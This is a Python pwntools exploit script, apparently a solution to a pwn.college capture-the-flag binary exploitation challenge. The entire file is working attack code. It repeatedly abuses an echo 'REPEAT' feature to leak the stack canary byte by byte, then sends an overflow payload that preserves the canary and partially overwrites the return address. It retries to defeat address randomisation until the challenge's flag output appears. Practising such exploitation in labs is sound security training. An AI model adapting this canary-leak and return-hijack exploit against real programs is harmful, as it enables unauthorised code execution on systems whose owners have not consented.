#!/bin/python

from pwn import * 
import sys

context.log_level = 'DEBUG'
#context.log_level = 'warn'

BACKDOOR=b'REPEAT'
BUFFER_SIZE=0x168
STACK_SIZE=0x1b0
RET_ADDR=0x1834

def get_stack_print(proc: process, stack_idx: int):
    stack_entry = stack_idx + STACK_SIZE * get_stack_print.counter

    payload = cyclic(stack_entry - len(BACKDOOR)) + BACKDOOR
    proc.sendline(str(len(payload)).encode())
    proc.send(payload)
    try:
        proc.recvuntil(b"You said: ")
        proc.recv(len(payload))
    except EOFError as _:
        proc.interactive()
        exit(1)

    get_stack_print.counter += 1

get_stack_print.counter = 0

def get_stack_byte(proc: process):
    byte = proc.recv(1)
    if byte != b'\n':
        print("Byte: " + str(byte))
    return byte if byte != b'\n' else b'\x00'


if len(sys.argv) <= 1: 
    print('Usage: ./mem_corruption.py [PROG]')
#    proc = gdb.debug(sys.argv[1], gdbscript="b challenge")

for _ in range(40):
    proc = process(sys.argv[1])
    canary = b''

    for stack_idx in range(8, BUFFER_SIZE, 8):
        get_stack_print(proc, stack_idx)      
        
        canary = get_stack_byte(proc)
        if canary != b'\x00':
            print("skiping")
            continue

        for i in range(7):
            if canary[i] == 0:
                get_stack_print(proc, stack_idx + i + 1)
            canary += get_stack_byte(proc)
        
        if canary != p64(0):
            break

    if len(canary) != 8:
        print("No canarie")
        exit(0)

    print(f"Canary: " + str(canary))


    payload = cyclic(BUFFER_SIZE) + canary + \
              cyclic(8) + p16(RET_ADDR)
    proc.sendline(str(len(payload)).encode())
    proc.send(payload)
    
    try:
        if proc.recvuntil(b"pwn.college", timeout=1) != '':
            print(proc.recvline())
            exit(0)
    except EOFError as _:
        pass

proc.interactive()
